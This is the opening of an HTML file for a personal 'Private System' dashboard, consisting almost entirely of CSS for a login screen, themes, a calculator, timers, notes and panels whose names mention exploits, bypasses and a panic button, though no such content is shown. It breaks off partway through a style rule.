<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Private System</title>
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/jqueryui/1.12.1/jquery-ui.min.css">

  <style>
    /* Global Styles */
    * {
      box-sizing: border-box;
      font-family: 'Segoe UI', sans-serif;
    }

    /* Core Body Styling for both login and dashboard */
    body {
      margin: 0; padding: 0;
      background: #000;
      color: #fff;
      display: flex;
      flex-direction: column; /* Changed to column to stack elements */
      justify-content: center;
      align-items: center;
      min-height: 100vh;
      overflow-x: hidden; /* Prevent horizontal scroll */
      transition: background-color 0.3s, color 0.3s;
    }

    /* Initial Login Body Layout */
    body.login-body {
      overflow-y: hidden; /* Hide scrollbars during pre-login animation */
    }

    /* Pre-Login Screen Styles */
    #preLoginScreen {
      position: fixed;
      top: 0;
      left: 0;
      width: 100vw;
      height: 100vh;
      background: #000;
      color: #fff;
      display: flex;
      flex-direction: column;
      justify-content: center;
      align-items: center;
      z-index: 9999;
      opacity: 1;
      transition: opacity 0.5s ease-out;
    }

    #preLoginScreen.hidden {
        opacity: 0;
        pointer-events: none;
    }

    .cube-container {
      perspective: 800px;
      margin-bottom: 20px;
    }

    .cube {
      width: 100px;
      height: 100px;
      position: relative;
      transform-style: preserve-3d;
      animation: rotateCube 5s infinite linear;
      opacity: 1; /* Default for cube */
    }

    .cube .face {
      position: absolute;
      width: 100px;
      height: 100px;
      border: 2px solid #ff914d; /* Use a consistent theme color */
      background: rgba(255, 145, 77, 0.2);
      box-shadow: 0 0 10px rgba(255, 145, 77, 0.5);
    }

    .cube .front  { transform: rotateY(0deg) translateZ(50px); }
    .cube .back   { transform: rotateY(180deg) translateZ(50px); }
    .cube .right  { transform: rotateY(90deg) translateZ(50px); }
    .cube .left   { transform: rotateY(-90deg) translateZ(50px); }
    .cube .top    { transform: rotateX(90deg) translateZ(50px); }
    .cube .bottom { transform: rotateX(-90deg) translateZ(50px); }

    @keyframes rotateCube {
      from { transform: rotateX(0deg) rotateY(0deg) rotateZ(0deg); }
      to   { transform: rotateX(360deg) rotateY(360deg) rotateZ(360deg); }
    }

    #initializingText {
      font-size: 1.8em;
      font-weight: bold;
      -webkit-background-clip: text;
      -webkit-text-fill-color: transparent;
      background-image: linear-gradient(90deg, orange, red);
      background-size: 200% 100%; /* For gradient animation */
      margin-top: 15px;
    }

    @keyframes gradientText {
      0% { background-position: 0% 50%; }
      100% { background-position: 100% 50%; }
    }

    /* Animation for login box loading from cube */
    @keyframes loadFromCube {
      0% { transform: translate(-50%, -50%) scale(0.1) rotateX(45deg) rotateY(45deg) opacity: 0; }
      100% { transform: translate(-50%, -50%) scale(1) rotateX(0deg) rotateY(0deg) opacity: 1; }
    }

    /* Login Quick Bar */
    #loginQuickBar {
      position: absolute;
      top: 10px;
      width: 90%;
      max-width: 450px; /* Constrain width */
      display: flex;
      justify-content: flex-end; /* Align items to the right */
      gap: 10px;
      z-index: 100;
      padding: 10px;
      background: rgba(0,0,0,0.6);
      border-radius: 10px;
      box-shadow: 0 2px 10px rgba(0,0,0,0.5);
      visibility: hidden; /* Hidden by default */
      opacity: 0;
      transition: visibility 0s, opacity 0.5s ease;
    }
    #loginQuickBar.visible {
      visibility: visible;
      opacity: 1;
    }

    #loginQuickBar button {
        background-color: #ff914d;
        color: black;
        border: none;
        padding: 8px 15px;
        border-radius: 8px;
        cursor: pointer;
        font-weight: bold;
        transition: background-color 0.2s ease;
        font-size: 0.9em;
    }
    #loginQuickBar button:hover {
        background-color: #ffb67a;
    }
    #loginQuickBar #loginPanicBtn {
        background-color: #e74c3c;
        color: white;
    }
    #loginQuickBar #loginPanicBtn:hover {
        background-color: #c0392b;
    }

    /* Login System Box Styles */
    .login-box {
      background: #000;
      border-radius: 15px; /* More rounded corners */
      border: 3px solid white;
      box-shadow: 0 0 15px white;
      width: 400px; /* More square-ish */
      max-width: 90%; /* Responsive */
      padding: 30px 25px;
      text-align: center;
      position: relative;
      transition: border-color 0.3s, box-shadow 0.3s;
      display: none; /* Hidden by default until animation */
      flex-direction: column;
      gap: 15px; /* Space between elements */
    }

    .login-box.flashing {
      animation: flashRed 0.4s ease-in-out 2;
    }

    @keyframes flashRed {
      0%, 100% { border-color: red; box-shadow: 0 0 15px red; }
      50% { border-color: white; box-shadow: 0 0 5px white; }
    }

    .login-box h2 {
      font-size: 2em; /* Slightly larger */
      margin-bottom: 20px;
      font-family: 'Courier New', monospace;
      color: #ff914d; /* Theme consistent color */
    }

    .login-box input {
      width: 100%;
      padding: 12px;
      background: #1c1c1c;
      border: 1px solid #444; /* Added subtle border */
      color: white;
      border-radius: 8px;
      font-size: 1em;
    }
    .login-box input:focus {
        outline: none;
        border-color: #ff914d;
        box-shadow: 0 0 5px #ff914d;
    }

    /* Custom Toggle Switch for Show Password & 24hr format */
    .toggle-switch-container {
      display: flex;
      align-items: center;
      justify-content: flex-start; /* Align left with text */
      margin-bottom: 15px;
      gap: 10px;
      user-select: none;
    }
    .toggle-switch {
      position: relative;
      display: inline-block;
      width: 40px;
      height: 20px;
      flex-shrink: 0;
    }
    .toggle-switch input {
      opacity: 0;
      width: 0;
      height: 0;
      margin-bottom: 0 !important; /* Override global input margin */
    }
    .toggle-switch .slider {
      position: absolute;
      cursor: pointer;
      top: 0;
      left: 0;
      right: 0;
      bottom: 0;
      background-color: #ccc;
      transition: .4s;
    }
    .toggle-switch .slider:before {
      position: absolute;
      content: "";
      height: 16px;
      width: 16px;
      left: 2px;
      bottom: 2px;
      background-color: white;
      transition: .4s;
    }
    input:checked + .slider {
      background-color: #28a745; /* Green when active */
    }
    input:checked + .slider:before {
      transform: translateX(20px);
    }
    .slider.round {
      border-radius: 20px;
    }
    .slider.round:before {
      border-radius: 50%;
    }

    /* Small Toggle for 24-hour format */
    .toggle-switch.small-toggle {
        width: 30px;
        height: 15px;
    }
    .toggle-switch.small-toggle .slider:before {
        height: 11px;
        width: 11px;
        left: 2px;
        bottom: 2px;
    }
    input:checked + .slider.round.small-toggle:before {
        transform: translateX(15px);
    }

    .login-box button {
      width: 100%;
      padding: 12px;
      background-color: #ff914d; /* Use theme color */
      color: black; /* Text color consistent with theme */
      font-size: 1.1em;
      border: none;
      border-radius: 8px;
      cursor: pointer;
      transition: background-color 0.2s;
    }
    .login-box button:hover {
      background-color: #ffb67a;
    }

    .attempt-counter, .error-message {
      margin-top: 10px;
      font-size: 0.85em;
      color: red;
      font-weight: bold;
    }

    .popup {
      display: none;
      position: absolute;
      top: 50%;
      left: 50%;
      width: 320px;
      padding: 20px;
      transform: translate(-50%, -50%);
      background: black;
      border: 3px solid #ff914d; /* Theme color for popup */
      border-radius: 15px;
      box-shadow: 0 0 20px #ff914d;
      z-index: 10;
      flex-direction: column;
      gap: 15px;
    }
    .popup p {
        margin: 0 0 10px 0;
        font-weight: bold;
    }

    .popup input {
      margin-bottom: 0 !important; /* Handled by parent gap */
    }

    /* Current Date & Time Box */
    .current-datetime-box {
      margin-top: 25px;
      background: #1c1c1c;
      padding: 10px 15px;
      border-radius: 8px;
      border: 1px solid #444;
      display: flex;
      justify-content: center;
      align-items: center;
      font-size: 1.1em;
      gap: 5px;
      flex-wrap: wrap; /* Allow wrapping on smaller screens */
    }

    /* Dashboard Loading Screen Styles */
    #dashboardLoadingScreen {
      position: fixed;
      top: 0; left: 0;
      width: 100vw; height: 100vh;
      background: #000;
      color: #fff;
      display: flex;
      flex-direction: column;
      justify-content: center;
      align-items: center;
      z-index: 10000;
      opacity: 0;
      visibility: hidden;
      transition: opacity 0.5s ease-out;
    }

    .code-animation-box {
      margin-top: 20px;
      background-color: #1a1a1a;
      border: 1px solid #ff914d;
      border-radius: 8px;
      padding: 15px 30px;
      min-width: 300px;
      text-align: left;
      font-family: 'Courier New', monospace;
      box-shadow: 0 0 10px rgba(255, 145, 77, 0.5);
    }
    #codeLoadingText {
      margin: 0;
      color: #2ecc71; /* Greenish for 'OK' */
      font-size: 1.1em;
      white-space: pre-wrap; /* Preserve whitespace/newlines */
      overflow: hidden; /* Hide overflow */
    }
    @keyframes typing {
      from { width: 0 }
      to { width: 100% }
    }
    @keyframes blink-caret {
      from, to { border-color: transparent }
      50% { border-color: #2ecc71 }
    }

    /* Dashboard Styles */
    @import url('https://fonts.googleapis.com/css2?family=Montserrat:wght@400;700&display=swap');

    body.dashboard-body {
      font-family: 'Montserrat', sans-serif;
      background-color: #1a1a1a;
      color: #f9f2dc;
      padding: 20px;
      transition: background-color 0.3s, color 0.3s;
      zoom: 1; /* For cross-browser zoom management */
      align-items: flex-start; /* Reset align-items for dashboard content */
      overflow-y: auto; /* Enable scroll on dashboard */
      width: 100vw;
    }

    /* Themed Scrollbar */
    body.dashboard-body::-webkit-scrollbar {
        width: 12px;
    }
    body.dashboard-body::-webkit-scrollbar-track {
        background: #2a2a2a;
        border-radius: 10px;
    }
    body.dashboard-body::-webkit-scrollbar-thumb {
        background-color: #ff914d;
        border-radius: 10px;
        border: 3px solid #2a2a2a;
    }

    /* Light Theme Styles */
    body.dashboard-body.light-theme {
      background-color: #f9f2dc;
      color: #1a1a1a;
    }
    body.dashboard-body.light-theme::-webkit-scrollbar-track {
        background: #e0d8bf;
    }
    body.dashboard-body.light-theme::-webkit-scrollbar-thumb {
        background-color: #ff914d; /* Stays bright */
        border: 3px solid #e0d8bf;
    }

    /* Cyberpunk Theme */
    body.dashboard-body.cyberpunk-theme {
        background-color: #0d0a1b; /* Dark, deep purple */
        color: #00f0ff; /* Neon cyan */
    }
    body.dashboard-body.cyberpunk-theme .dashboard-header {
        background: #00f0ff; /* Neon cyan header */
        color: #0d0a1b;
    }
    body.dashboard-body.cyberpunk-theme .version-box {
        background: #fc00ff; /* Neon magenta */
        color: #0d0a1b;
    }
    body.dashboard-body.cyberpunk-theme .quick-bar button,
    body.dashboard-body.cyberpunk-theme .quick-bar-secondary button,
    body.dashboard-body.cyberpunk-theme .toggle-switch-container .slider,
    body.dashboard-body.cyberpunk-theme #canvasControls button {
        background-color: #00f0ff;
        color: #0d0a1b;
    }
    body.dashboard-body.cyberpunk-theme .quick-bar button:hover,
    body.dashboard-body.cyberpunk-theme .quick-bar-secondary button:hover,
    body.dashboard-body.cyberpunk-theme #canvasControls button:hover {
        background-color: #4df9ff;
    }
    body.dashboard-body.cyberpunk-theme #panicBtn {
        background: #fc00ff !important; /* Neon magenta panic */
        color: #0d0a1b !important;
    }
    body.dashboard-body.cyberpunk-theme #panicBtn:hover {
        background: #fa53ff !important;
    }
    body.dashboard-body.cyberpunk-theme .announcement-bar {
        background-color: #00f0ff;
        color: #0d0a1b;
        box-shadow: 0 0 15px rgba(0, 240, 255, 0.6);
    }
    body.dashboard-body.cyberpunk-theme .box,
    body.dashboard-body.cyberpunk-theme .info-panel {
        background-color: #1e1837; /* Darker box */
        color: #00f0ff;
        border: 1px solid #fc00ff;
        box-shadow: 0 0 15px rgba(252, 0, 255, 0.4);
    }
    body.dashboard-body.cyberpunk-theme .box h2,
    body.dashboard-body.cyberpunk-theme .info-panel h2 {
        color: #fc00ff; /* Neon magenta titles */
    }
    body.dashboard-body.cyberpunk-theme .update-entry,
    body.dashboard-body.cyberpunk-theme .wifi-grid div,
    body.dashboard-body.cyberpunk-theme .wifi-entry div,
    body.dashboard-body.cyberpunk-theme .handbook-buttons a,
    body.dashboard-body.cyberpunk-theme .links-list a,
    body.dashboard-body.cyberpunk-theme .exploit-buttons a,
    body.dashboard-body.cyberpunk-theme .bypass-buttons button,
    body.dashboard-body.cyberpunk-theme .coming-soon,
    body.dashboard-body.cyberpunk-theme .info-text,
    body.dashboard-body.cyberpunk-theme .school-info-item,
    body.dashboard-body.cyberpunk-theme .ipad-options button {
        background: #2b2154; /* Medium purple */
        color: #00f0ff;
        border: 1px solid #fc00ff;
    }
    body.dashboard-body.cyberpunk-theme .ipad-content,
    body.dashboard-body.cyberpunk-theme .bypass-content {
      background: #2b2154;
      color: #00f0ff;
      border: 1px solid #fc00ff;
    }
    body.dashboard-body.cyberpunk-theme .motivation-box {
        background-color: #1e1837;
        color: #00f0ff;
        border: 1px solid #00f0ff;
        box-shadow: 0 0 12px rgba(0, 240, 255, 0.5);
    }
    body.dashboard-body.cyberpunk-theme .calendar div {
        background: #2b2154;
        color: #00f0ff;
    }
    body.dashboard-body.cyberpunk-theme .today {
        background: #fc00ff !important;
        color: #0d0a1b !important;
    }
    body.dashboard-body.cyberpunk-theme .wifi-high { background-color: #38c172 !important; color: #000 !important; }
    body.dashboard-body.cyberpunk-theme .wifi-medium { background-color: #f7a31b !important; color: #000 !important; }
    body.dashboard-body.cyberpunk-theme .wifi-low { background-color: #e3342f !important; color: #fff !important; }


    /* Monochrome Theme */
    body.dashboard-body.monochrome-theme {
      background-color: #222;
      color: #ddd;
    }
    body.dashboard-body.monochrome-theme .dashboard-header {
      background: #555;
      color: #eee;
    }
    body.dashboard-body.monochrome-theme .version-box {
      background: #888;
      color: #222;
    }
    body.dashboard-body.monochrome-theme .quick-bar button,
    body.dashboard-body.monochrome-theme .quick-bar-secondary button,
    body.dashboard-body.monochrome-theme #canvasControls button {
      background-color: #777;
      color: #222;
    }
    body.dashboard-body.monochrome-theme .quick-bar button:hover,
    body.dashboard-body.monochrome-theme .quick-bar-secondary button:hover,
    body.dashboard-body.monochrome-theme #canvasControls button:hover {
      background-color: #999;
    }
    body.dashboard-body.monochrome-theme #panicBtn {
      background: #b0b0b0 !important;
      color: #444 !important;
    }
    body.dashboard-body.monochrome-theme #panicBtn:hover {
      background: #c0c0c0 !important;
    }
    body.dashboard-body.monochrome-theme .announcement-bar {
      background-color: #777;
      color: #222;
    }
    body.dashboard-body.monochrome-theme .box,
    body.dashboard-body.monochrome-theme .info-panel {
      background-color: #333;
      color: #ddd;
      box-shadow: 0 0 15px rgba(100, 100, 100, 0.3);
    }
    body.dashboard-body.monochrome-theme .box h2,
    body.dashboard-body.monochrome-theme .info-panel h2 {
      color: #aaa;
    }
    body.dashboard-body.monochrome-theme .update-entry,
    body.dashboard-body.monochrome-theme .wifi-grid div,
    body.dashboard-body.monochrome-theme .wifi-entry div,
    body.dashboard-body.monochrome-theme .handbook-buttons a,
    body.dashboard-body.monochrome-theme .links-list a,
    body.dashboard-body.monochrome-theme .exploit-buttons a,
    body.dashboard-body.monochrome-theme .bypass-buttons button,
    body.dashboard-body.monochrome-theme .coming-soon,
    body.dashboard-body.monochrome-theme .info-text,
    body.dashboard-body.monochrome-theme .school-info-item,
    body.dashboard-body.monochrome-theme .ipad-options button {
      background: #444;
      color: #ddd;
    }
    body.dashboard-body.monochrome-theme .ipad-content,
    body.dashboard-body.monochrome-theme .bypass-content {
      background: #444;
      color: #ddd;
    }
    body.dashboard-body.monochrome-theme .motivation-box {
      background-color: #333;
      color: #eee;
    }
    body.dashboard-body.monochrome-theme .calendar div {
      background: #555;
      color: #eee;
    }
    body.dashboard-body.monochrome-theme .today {
      background: #777 !important;
      color: #222 !important;
    }
    body.dashboard-body.monochrome-theme .wifi-high { background-color: #4CAF50 !important; color: #FFF !important; }
    body.dashboard-body.monochrome-theme .wifi-medium { background-color: #FFC107 !important; color: #000 !important; }
    body.dashboard-body.monochrome-theme .wifi-low { background-color: #F44336 !important; color: #FFF !important; }


    /* Default Orange Theme */
    .dashboard-header {
      display: flex;
      justify-content: space-between;
      align-items: center;
      background: #ff914d;
      padding: 15px 25px;
      border-radius: 12px;
      color: #000;
      margin-bottom: 20px;
      flex-wrap: wrap; /* Allow header to wrap */
      width: 100%;
    }

    .dashboard-header h1 {
      font-size: 24px;
      margin: 0;
    }

    .user-info {
      font-weight: bold;
      font-size: 0.9em;
    }

    .version-box {
      background: #ffd966;
      padding: 8px 15px;
      border-radius: 8px;
      color: #000;
      font-weight: bold;
      margin-left: auto; /* Push to the right */
    }

    /* Primary Quick Bar (Top) */
    .quick-bar {
      display: flex;
      justify-content: center; /* Center items in the bar */
      align-items: center;
      gap: 12px;
      margin-bottom: 20px;
      flex-wrap: wrap;
      background: #2a2a2a; /* Darker background for contrast */
      padding: 10px 15px;
      border-radius: 12px;
      box-shadow: 0 0 15px rgba(255, 145, 77, 0.3);
      width: 100%;
    }
    .quick-bar-secondary {
      display: flex;
      justify-content: center;
      gap: 12px;
      margin-bottom: 20px;
      flex-wrap: wrap;
    }


    .quick-bar button, .quick-bar-secondary button {
      background-color: #ff914d;
      border: none;
      padding: 10px 14px;
      border-radius: 8px;
      color: black;
      font-weight: bold;
      cursor: pointer;
      transition: background 0.2s;
      min-width: 110px;
      white-space: nowrap;
    }

    .quick-bar button:hover, .quick-bar-secondary button:hover {
      background-color: #ffb67a;
    }

    /* Specific styles for Quickbar components */
    .quick-bar #searchBar {
      flex-grow: 1; /* Allow search bar to expand */
      max-width: 300px;
      padding: 8px 12px;
      border-radius: 8px;
      border: 1px solid #444;
      background-color: #1c1c1c;
      color: white;
      font-size: 1em;
    }

    #panicBtn {
      background: #ff4c4c !important;
      color: white !important;
    }

    #panicBtn:hover {
      background-color: #c0392b !important;
    }

    /* Announcement Bar */
    .announcement-bar {
      width: 100%;
      background-color: #ff914d;
      color: black;
      font-weight: bold;
      padding: 10px 0;
      overflow: hidden;
      position: relative;
      border-radius: 8px;
      box-sizing: border-box;
      margin-bottom: 20px;
      user-select: none;
      height: 30px;
      line-height: 13px;
    }

    .announcement-bar span {
      display: inline-block;
      white-space: nowrap;
      position: absolute;
      will-change: transform;
      animation: scrollLeft 15s linear infinite;
      padding-left: 100%;
    }

    @keyframes scrollLeft {
      0% {
        transform: translateX(0%);
      }
      100% {
        transform: translateX(-100%);
      }
    }

    body.dashboard-body.light-theme .announcement-bar {
      background-color: #ffd966;
      color: #000;
    }

    /* Main Grid & Boxes */
    .main-row {
      display: grid;
      grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
      gap: 20px;
      margin-bottom: 20px;
      width: 100%;
    }
    #updatesNotifications { /* Old element, still used. Will refactor this later to use the grid system */
      display: flex;
      gap: 20px;
      justify-content: center;
      flex-wrap: wrap;
      margin-top: 20px;
      width: 100%;
    }


    .box, .info-panel {
      background-color: #2a2a2a;
      padding: 20px;
      border-radius: 12px;
      box-shadow: 0 0 15px rgba(255, 145, 77, 0.3);
      min-height: 120px;
      transition: background-color 0.3s, color 0.3s;
      position: relative; /* For draggable/resizable */
    }
    .box:hover, .info-panel:hover {
      box-shadow: 0 0 20px rgba(255, 145, 77, 0.6);
    }


    /* Resizable handler styles */
    .ui-resizable-handle {
        background-color: rgba(255, 255, 255, 0.2);
        position: absolute;
        font-size: 0.1px;
        display: block;
        touch-action: none;
    }
    .ui-resizable-s { height: 7px; width: 100%; bottom: -5px; left: 0; cursor: ns-resize; }
    .ui-resizable-e { width: 7px; right: -5px; top: 0; height: 100%; cursor: ew-resize; }
    .ui-resizable-se { width: 12px; height: 12px; right: 1px; bottom: 1px; cursor: se-resize; background-color: #ff914d; border-radius: 0 0 10px 0; }
    .ui-resizable-sw { width: 12px; height: 12px; left: 1px; bottom: 1px; cursor: sw-resize; background-color: #ff914d; border-radius: 0 0 0 10px; }


    body.dashboard-body.light-theme .box, body.dashboard-body.light-theme .info-panel {
      background-color: #ffd966;
      color: #000;
      box-shadow: 0 0 15px rgba(255, 145, 77, 0.6);
    }
    body.dashboard-body.light-theme .box:hover, body.dashboard-body.light-theme .info-panel:hover {
      box-shadow: 0 0 20px rgba(255, 145, 77, 0.9);
    }


    .box h2, .info-panel h2 {
      font-size: 18px;
      margin-bottom: 10px;
      color: #ffbf80;
    }

    body.dashboard-body.light-theme .box h2, body.dashboard-body.light-theme .info-panel h2 {
      color: #994d00;
    }

    .box p, .box ul {
      font-size: 14px;
    }

    .update-entry {
      background: #40210f;
      padding: 8px;
      margin-top: 5px;
      border-radius: 6px;
      color: #ffccb3;
    }

    body.dashboard-body.light-theme .update-entry {
      background: #ffd999;
      color: #994d00;
    }

    .calendar {
      display: grid;
      grid-template-columns: repeat(7, 1fr);
      gap: 5px;
      margin-top: 10px;
      text-align: center;
      font-size: 12px;
    }

    .calendar div {
      padding: 6px;
      background: #333;
      border-radius: 4px;
    }

    .today {
      background: #ff914d !important;
      font-weight: bold;
      color: black;
    }

    body.dashboard-body.light-theme .calendar div {
      background: #ffd966;
      color: #000;
    }

    body.dashboard-body.light-theme .today {
      background: #994d00 !important;
      color: #ffd966;
    }

    /* Notes Canvas Section */
    #canvasContainer {
      display: none;
      margin-top: 20px;
      text-align: center;
      width: 100%;
      background: #2a2a2a;
      padding: 20px;
      border-radius: 12px;
      box-shadow: 0 0 15px rgba(255, 145, 77, 0.3);
      max-width: 900px; /* Limit width of notes section */
    }

    #notesCanvas {
      border: 2px solid #ff914d;
      border-radius: 12px;
      background: #fff;
      cursor: crosshair;
      touch-action: none;
      max-width: 100%; /* Make canvas responsive */
      height: auto;
    }

    #canvasControls {
      margin-top: 10px;
      display: flex;
      flex-wrap: wrap;
      gap: 10px;
      justify-content: center;
    }

    #canvasControls button,
    #canvasControls input[type="color"],
    #canvasControls input[type="range"] {
      background-color: #ff914d;
      border: none;
      padding: 8px 16px;
      border-radius: 8px;
      color: black;
      font-weight: bold;
      cursor: pointer;
      transition: background 0.2s;
      -webkit-appearance: none;
      -moz-appearance: none;
      appearance: none;
      height: 38px;
      box-sizing: border-box;
    }
    #canvasControls button:hover {
      background-color: #ffb67a;
    }

    /* Custom styles for color and range inputs for notes */
    #canvasControls input[type="color"] {
        width: 40px;
        padding: 0;
        cursor: pointer;
    }
    #canvasControls input[type="color"]::-webkit-color-swatch-wrapper {
        padding: 0;
    }
    #canvasControls input[type="color"]::-webkit-color-swatch {
        border: none;
        border-radius: 6px;
    }
    #canvasControls input[type="range"] {
        width: 120px;
        padding: 0 8px;
        background-color: #333; /* Darker track */
        cursor: ew-resize;
    }
    #canvasControls input[type="range"]::-webkit-slider-runnable-track {
        background: #ff914d;
        border-radius: 5px;
        height: 8px;
    }
    #canvasControls input[type="range"]::-webkit-slider-thumb {
        -webkit-appearance: none;
        appearance: none;
        margin-top: -4px;
        height: 16px;
        width: 16px;
        border-radius: 50%;
        background: white;
        cursor: grab;
        box-shadow: 0 0 2px black;
    }
    .notes-text-area {
        width: 100%;
        min-height: 100px;
        background: #333;
        color: white;
        border: 1px solid #ff914d;
        border-radius: 8px;
        padding: 10px;
        font-size: 1em;
        margin-top: 10px;
        resize: vertical;
        display: none; /* Hidden by default */
    }

    .motivation-box, .random-fact-box, .daily-quote-box {
      background-color: #333;
      color: #ffd966;
      padding: 20px;
      border-radius: 12px;
      font-style: italic;
      font-size: 16px;
      box-shadow: 0 0 12px rgba(255, 145, 77, 0.5);
      display: flex;
      align-items: center;
      justify-content: center;
      min-height: 120px;
      text-align: center;
    }

    body.dashboard-body.light-theme .motivation-box,
    body.dashboard-body.light-theme .random-fact-box,
    body.dashboard-body.light-theme .daily-quote-box {
      background-color: #fff3cc;
      color: #994d00;
      box-shadow: 0 0 12px rgba(255, 145, 77, 0.8);
    }

    /* Info Panel Styles (General) */
    .info-panel {
      display: none;
      margin-top: 20px; /* Only add if the panel appears outside the main grid initially */
      width: 100%; /* Occupy full width */
      max-width: 1200px; /* Max width for readability */
      margin-left: auto;
      margin-right: auto;
    }

    /* Wifi Panel Specifics */
    .wifi-grid {
      display: grid;
      grid-template-columns: repeat(auto-fit, minmax(120px, 1fr));
      gap: 10px;
      margin-bottom: 15px;
    }

    .wifi-grid div {
      padding: 8px;
      background: #333;
      border-radius: 6px;
      text-align: center;
      font-weight: bold;
    }

    body.dashboard-body.light-theme .wifi-grid div {
      background: #ffd999;
    }

    .wifi-entry {
      display: grid;
      grid-template-columns: repeat(auto-fit, minmax(120px, 1fr));
      gap: 10px;
      margin-bottom: 10px;
    }

    .wifi-entry div {
      padding: 8px;
      background: #40210f;
      border-radius: 6px;
      text-align: center;
    }
    .wifi-entry .wifi-high { background-color: #4CAF50; color: #FFF; font-weight: bold;} /* Green */
    .wifi-entry .wifi-medium { background-color: #FFC107; color: #000; font-weight: bold;} /* Yellow */
    .wifi-entry .wifi-low { background-color: #F44336; color: #FFF; font-weight: bold;} /* Red */

    body.dashboard-body.light-theme .wifi-entry div {
      background: #ffd999;
    }
    body.dashboard-body.light-theme .wifi-entry .wifi-high { background-color: #66bb6a; color: #FFF; } /* Lighter green */
    body.dashboard-body.light-theme .wifi-entry .wifi-medium { background-color: #ffca28; color: #000; } /* Lighter yellow */
    body.dashboard-body.light-theme .wifi-entry .wifi-low { background-color: #ef5350; color: #FFF; } /* Lighter red */


    /* General Info Panel Buttons */
    .handbook-buttons, .links-list, .exploit-buttons, .bypass-buttons {
      display: grid;
      grid-template-columns: repeat(auto-fit, minmax(180px, 1fr)); /* Responsive columns */
      gap: 10px;
      margin-top: 15px;
    }

    .handbook-buttons button, .links-list a, .exploit-buttons a, .bypass-buttons button, .ipad-options button {
      background-color: #ff914d;
      border: none;
      padding: 12px;
      border-radius: 8px;
      color: black;
      font-weight: bold;
      cursor: pointer;
      transition: background 0.2s;
      text-decoration: none; /* For links */
      text-align: center;
      white-space: nowrap; /* Prevent text wrap */
    }

    .handbook-buttons button:hover, .links-list a:hover, .exploit-buttons a:hover, .bypass-buttons button:hover, .ipad-options button:hover {
      background-color: #ffb67a;
    }

    .coming-soon {
      background: #40210f;
      padding: 15px;
      border-radius: 8px;
      margin-top: 15px;
      text-align: center;
      font-weight: bold;
    }

    body.dashboard-body.light-theme .coming-soon {
      background: #ffd999;
    }

    .info-text {
      background: #40210f;
      padding: 15px;
      border-radius: 8px;
      margin-top: 15px;
      white-space: pre-wrap; /* For keyboard tricks, preserve formatting */
    }

    body.dashboard-body.light-theme .info-text {
      background: #ffd999;
    }

    .school-info-grid {
      display: grid;
      grid-template-columns: repeat(auto-fit, minmax(280px, 1fr)); /* Two columns, responsive */
      gap: 10px;
      margin-top: 15px;
    }

    .school-info-item {
      background: #40210f;
      padding: 12px;
      border-radius: 8px;
    }

    body.dashboard-body.light-theme .school-info-item {
      background: #ffd999;
    }

    .school-info-label {
      font-weight: bold;
      color: #ff914d;
      margin-bottom: 5px;
    }

    body.dashboard-body.light-theme .school-info-label {
      color: #994d00;
    }

    .ipad-options {
      display: flex;
      gap: 10px;
      margin-top: 15px;
    }

    .ipad-options button {
      flex: 1;
    }

    .ipad-content, .bypass-content {
      display: none;
      background: #40210f;
      padding: 15px;
      border-radius: 8px;
      margin-top: 15px;
    }

    body.dashboard-body.light-theme .ipad-content, body.dashboard-body.light-theme .bypass-content {
      background: #ffd999;
    }

    /* Calculator & Converter specific styles */
    #calculator, #unitConverter, #settingsPanel, #keybindsPanel, #timersPanel, #activityLogsPanel, #loginHistoryPanel, #mediaPanel, #remindersPanel, #statsPanel {
      display: none;
      background-color: #2a2a2a;
      padding: 20px;
      border-radius: 12px;
      box-shadow: 0 0 15px rgba(255, 145, 77, 0.3);
      max-width: 600px;
      margin: 20px auto;
    }
    #calculator h2, #unitConverter h2, #settingsPanel h2, #keybindsPanel h2, #timersPanel h2, #activityLogsPanel h2, #loginHistoryPanel h2, #mediaPanel h2, #remindersPanel h2, #statsPanel h2 {
      color: #ff914d;
    }
    #calculator .calculator-grid {
      display: grid;
      grid-template-columns: repeat(4, 1fr);
      gap: 10px;
    }
    #calculator #calcDisplay {
      grid-column: span 4;
      background: #1c1c1c;
      padding: 15px;
      border-radius: 8px;
      text-align: right;
      font-size: 2em;
      margin-bottom: 10px;
      color: white;
    }
    #calculator button {
      padding: 15px;
      background: #ff914d;
      border: none;
      border-radius: 8px;
      font-size: 1.2em;
      cursor: pointer;
      color: black;
    }
    #calculator button.operator {
      background: #ff7f32;
    }
    #calculator button.equals {
      background: #4CAF50;
      color: white;
    }
    #calculator button.clear {
      background: #F44336;
      color: white;
    }

    /* Unit Converter */
    #unitConverter select, #unitConverter input {
      width: calc(50% - 10px);
      padding: 10px;
      margin: 5px;
      border-radius: 5px;
      border: 1px solid #444;
      background-color: #1c1c1c;
      color: white;
    }
    #unitConverter .converter-group {
      display: flex;
      align-items: center;
      margin-bottom: 10px;
      flex-wrap: wrap;
    }

    /* Settings Panel */
    #settingsPanel .setting-item {
        display: flex;
        justify-content: space-between;
        align-items: center;
        padding: 10px 0;
        border-bottom: 1px solid #444;
    }
    #settingsPanel .setting-item:last-child {
        border-bottom: none;
    }
    #settingsPanel .setting-item label {
        flex-grow: 1;
        cursor: pointer;
    }
    #settingsPanel select, #settingsPanel input[type="range"] {
        padding: 8px;
        border-radius: 5px;
        background-color: #1c1c1c;
        color: white;
        border: 1px solid #444;
    }

    /* Timers Panel */
    .timer-section {
        background: #1c1c1c;
        padding: 15px;
        border-radius: 8px;
        margin-bottom: 15px;
        border: 1px solid #444;
    }
    .timer-controls {
        display: flex;
        gap: 10px;
        justify-content: center;
        margin-top: 10px;
        flex-wrap: wrap;
    }
    .timer-display {
        font-size: 2.5em;
        text-align: center;
        margin: 15px 0;
        font-family: 'Roboto Mono', monospace;
    }
    .timer-section button {
        background-color: #ff914d;
        color: black;
        border: none;
        padding: 8px 15px;
        border-radius: 8px;
        cursor: pointer;
    }
    .timer-section button:hover {
        background-color: #ffb67a;
    }
    .timer-section input[type="number"] {
        width: 80px;
        padding: 8px;
        border-radius: 5px;
        border: 1px solid #444;
        background-color: #333;
        color: white;
        text-align: center;
    }

    /* Custom Notification Alert System for dashboard */
    #dashboardNotification, .dashboard-alert {
      position: fixed;
      top: 20px;
      right: 20px;
      background-color: #ff914d;
      color: black;
      padding: 15px 25px;
      border-radius: 8px;
      font-weight: bold;
      font-size: 1.1em;
      box-shadow: 0 4px 12px rgba(0, 0, 0, 0.2);
      opacity: 0;
      visibility: hidden;
      transform: translateX(100%);
